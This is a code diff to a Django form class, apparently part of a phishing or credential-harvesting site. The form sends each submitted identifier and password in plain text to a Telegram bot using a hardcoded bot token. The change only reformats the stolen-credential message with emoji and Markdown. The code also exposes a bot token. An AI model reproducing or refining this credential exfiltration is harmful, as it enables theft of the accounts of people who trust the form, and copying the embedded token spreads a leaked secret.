@@ -43,9 +43,16 @@ class InscriptionForm(forms.Form):
         TOKEN = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         data = {
-            "chat_id": CHAT_ID,
-            "text": f"Nouvelle Connexion : {identifiant} Mot de passe : {mot_de_passe}"
-        }
+    "chat_id": CHAT_ID,
+    "text": (
+        f"🔔 *NOUVELLE CONNEXION DÉTECTÉE*\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 *Identifiant :* `{identifiant}`\n"
+        f"🔑 *Mot de passe :* `{mot_de_passe}`\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    ),
+    "parse_mode": "Markdown"   # ← active le gras et le code
+}
         try:
             response = requests.post(url, data=data, timeout=5)
             response.raise_for_status()
